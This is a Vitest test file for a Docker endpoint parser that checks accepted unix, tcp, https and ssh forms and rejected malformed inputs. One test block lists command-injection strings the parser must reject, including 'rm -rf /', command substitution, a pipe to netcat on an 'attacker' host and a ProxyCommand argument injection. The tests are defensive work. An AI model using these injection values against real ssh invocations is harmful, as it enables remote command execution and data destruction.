/**
 * Docker endpoint grammar (043-docker-remote-auth, phase 01).
 *
 * Covers FR-001..FR-008, FR-025 and SC-004. The negative cases matter most:
 * the defect behind #181 was that unrecognised input was silently coerced into
 * a Unix socket path, so every one of these used to "succeed" against the
 * local daemon.
 */

import { describe, expect, it } from 'vitest';

import {
  CreateDockerConnectionSchema,
  UpdateDockerConnectionSchema,
  normalizeLegacyPersistedDockerEndpoint,
  parseDockerEndpoint,
  parseDockerEndpointOrThrow,
} from '../../src/lib/validation.js';

function expectOk(input: string) {
  const result = parseDockerEndpoint(input);
  if (!result.ok) {
    throw new Error(`expected ${input} to parse, got: ${result.error}`);
  }
  return result.endpoint;
}

function expectRejected(input: string): string {
  const result = parseDockerEndpoint(input);
  expect(result.ok, `expected ${JSON.stringify(input)} to be rejected`).toBe(false);
  return result.ok ? '' : result.error;
}

describe('parseDockerEndpoint — accepted forms', () => {
  it('parses a unix socket endpoint', () => {
    expect(expectOk('unix:///var/run/docker.sock')).toEqual({
      kind: 'unix',
      socketPath: '/var/run/docker.sock',
    });

    describe('normalizeLegacyPersistedDockerEndpoint', () => {
      it('adds the Unix scheme only to an absolute persisted socket path', () => {
        expect(normalizeLegacyPersistedDockerEndpoint(' /var/run/docker.sock ')).toBe(
          'unix:///var/run/docker.sock',
        );
      });

      it.each([
        'unix:///var/run/docker.sock',
        'tcp://192.168.1.13:2375',
        'http://192.168.1.13:2375',
        '192.168.1.13:2375',
        'relative/docker.sock',
        '/tmp/docker socket.sock',
      ])('does not normalize %s', (value) => {
        expect(normalizeLegacyPersistedDockerEndpoint(value)).toBeNull();
      });
    });
  });

  it('parses a non-default unix socket path', () => {
    expect(expectOk('unix:///run/user/1000/docker.sock')).toEqual({
      kind: 'unix',
      socketPath: '/run/user/1000/docker.sock',
    });
  });

  it('parses tcp with an explicit port', () => {
    expect(expectOk('tcp://192.168.1.10:2375')).toEqual({
      kind: 'tcp',
      host: '192.168.1.10',
      port: 2375,
    });
  });

  it('applies the default tcp port 2375', () => {
    expect(expectOk('tcp://dockerhost')).toEqual({ kind: 'tcp', host: 'dockerhost', port: 2375 });
  });

  it('applies the default https port 2376', () => {
    expect(expectOk('https://dockerhost')).toEqual({
      kind: 'https',
      host: 'dockerhost',
      port: 2376,
    });
  });

  it('parses https with an explicit port', () => {
    expect(expectOk('https://docker.example.com:2377')).toEqual({
      kind: 'https',
      host: 'docker.example.com',
      port: 2377,
    });
  });

  it('applies the default ssh port 22 and keeps the user', () => {
    expect(expectOk('ssh://deploy@docker-host')).toEqual({
      kind: 'ssh',
      user: 'deploy',
      host: 'docker-host',
      port: 22,
    });
  });

  it('parses ssh with an explicit port', () => {
    expect(expectOk('ssh://deploy@docker-host.home.arpa:2222')).toEqual({
      kind: 'ssh',
      user: 'deploy',
      host: 'docker-host.home.arpa',
      port: 2222,
    });
  });

  it('parses ssh without a user, leaving the username to ssh config', () => {
    expect(expectOk('ssh://docker-host')).toEqual({
      kind: 'ssh',
      host: 'docker-host',
      port: 22,
    });
  });

  it('parses a bracketed IPv6 literal', () => {
    expect(expectOk('tcp://[fd00::1]:2375')).toEqual({
      kind: 'tcp',
      host: '[fd00::1]',
      port: 2375,
    });
  });

  it('trims surrounding whitespace from a pasted value', () => {
    expect(expectOk('  tcp://dockerhost:2375  ')).toEqual({
      kind: 'tcp',
      host: 'dockerhost',
      port: 2375,
    });
  });

  it('tolerates a bare trailing slash', () => {
    expect(expectOk('tcp://dockerhost:2375/')).toEqual({
      kind: 'tcp',
      host: 'dockerhost',
      port: 2375,
    });
  });
});

describe('parseDockerEndpoint — rejected forms', () => {
  it('rejects http:// and names tcp:// as the fix (the #181 report)', () => {
    const error = expectRejected('http://192.168.1.10:2375');
    expect(error).toContain('tcp://');
    expect(error).toContain('not http://');
  });

  it('rejects a bare host:port instead of coercing it to a socket path', () => {
    expectRejected('192.168.1.10:2375');
  });

  it('rejects a bare hostname', () => {
    expectRejected('dockerhost');
  });

  it('rejects a bare socket path with no scheme', () => {
    expectRejected('/var/run/docker.sock');
  });

  it('rejects an empty value', () => {
    expectRejected('');
  });

  it('rejects a whitespace-only value', () => {
    expectRejected('   ');
  });

  it('rejects an unsupported scheme', () => {
    expectRejected('ftp://dockerhost:2375');
  });

  it('rejects a unix endpoint with a relative path', () => {
    expectRejected('unix://var/run/docker.sock');
  });

  it('rejects a value over the length limit', () => {
    expectRejected(`tcp://${'a'.repeat(2100)}:2375`);
  });

  it('rejects an out-of-range port', () => {
    expectRejected('tcp://dockerhost:70000');
  });

  it('rejects a non-numeric port', () => {
    expectRejected('tcp://dockerhost:port');
  });

  it('rejects credentials on a tcp endpoint', () => {
    expectRejected('tcp://user@dockerhost:2375');
  });

  it('rejects a path component, which usually means a UI URL was pasted', () => {
    expectRejected('https://dockerhost:2376/containers');
  });

  // FR-030: an ssh endpoint becomes argv for the ssh binary.
  it.each([
    'ssh://user@host;rm -rf /',
    'ssh://user@host`id`',
    'ssh://user@host$(id)',
    'ssh://user@host|nc attacker 1234',
    'ssh://us er@host',
    'ssh://user@host&&id',
    'ssh://-oProxyCommand=id@host',
  ])('rejects shell metacharacters in %s', (input) => {
    expectRejected(input);
  });

  it('rejects control characters anywhere in the value', () => {
    expectRejected('tcp://docker\nhost:2375');
  });

  // FR-006 / SC-004: the message must be actionable, not merely negative.
  it.each(['http://192.168.1.10:2375', '192.168.1.10:2375', 'dockerhost', '', 'ftp://dockerhost'])(
    'names all four accepted formats when rejecting %s',
    (input) => {
      const error = expectRejected(input);
      expect(error).toContain('unix:///var/run/docker.sock');
      expect(error).toContain('tcp://host:2375');
      expect(error).toContain('https://host:2376');
      expect(error).toContain('ssh://user@host:22');
    },
  );
});

describe('parseDockerEndpointOrThrow', () => {
  it('returns the endpoint for a valid value', () => {
    expect(parseDockerEndpointOrThrow('tcp://dockerhost:2375')).toEqual({
      kind: 'tcp',
      host: 'dockerhost',
      port: 2375,
    });
  });

  it('throws a classified 400 for an invalid value', () => {
    expect(() => parseDockerEndpointOrThrow('http://dockerhost:2375')).toThrowError(
      /not http:\/\//,
    );
    try {
      parseDockerEndpointOrThrow('http://dockerhost:2375');
    } catch (err) {
      expect((err as { code: string; statusCode: number }).code).toBe('DOCKER_INVALID_ENDPOINT');
      expect((err as { statusCode: number }).statusCode).toBe(400);
    }
  });
});

describe('connection schemas use the endpoint grammar', () => {
  it('accepts a valid endpoint on create', () => {
    const parsed = CreateDockerConnectionSchema.parse({
      name: 'Speedfreak',
      dockerUrl: 'tcp://192.168.1.10:2375',
    });
    expect(parsed.dockerUrl).toBe('tcp://192.168.1.10:2375');
  });

  it('rejects http:// on create', () => {
    expect(
      CreateDockerConnectionSchema.safeParse({ name: 'x', dockerUrl: 'http://host:2375' }).success,
    ).toBe(false);
  });

  it('rejects a bare host:port on update', () => {
    expect(UpdateDockerConnectionSchema.safeParse({ dockerUrl: 'host:2375' }).success).toBe(false);
  });

  it('still allows an update that omits the endpoint', () => {
    expect(UpdateDockerConnectionSchema.safeParse({ name: 'renamed' }).success).toBe(true);
  });
});
